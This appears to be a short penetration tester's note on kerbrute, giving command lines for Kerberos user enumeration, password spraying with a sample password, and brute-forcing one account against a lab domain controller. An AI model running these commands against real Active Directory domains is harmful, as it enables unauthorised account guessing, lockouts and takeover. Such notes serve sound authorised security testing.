---
tags: [tool, activedirectory, kerberos]
tool: "kerbrute"
category: "Active Directory"
installed: true
phase: [enumeration]
---

# kerbrute - Kerberos Bruteforce

## Tool Overview
Purpose: Kerberos bruteforce and enumeration
Location: ~/tools/activedirectory/kerbrute

## How to Use It

User Enumeration:
kerbrute userenum -d domain.local users.txt --dc 10.10.10.100

Password Spray:
kerbrute passwordspray -d domain.local users.txt 'Password123!' --dc 10.10.10.100

Bruteforce:
kerbrute bruteuser -d domain.local passwords.txt username --dc 10.10.10.100

## Related Tools
GetNPUsers.py, rubeus
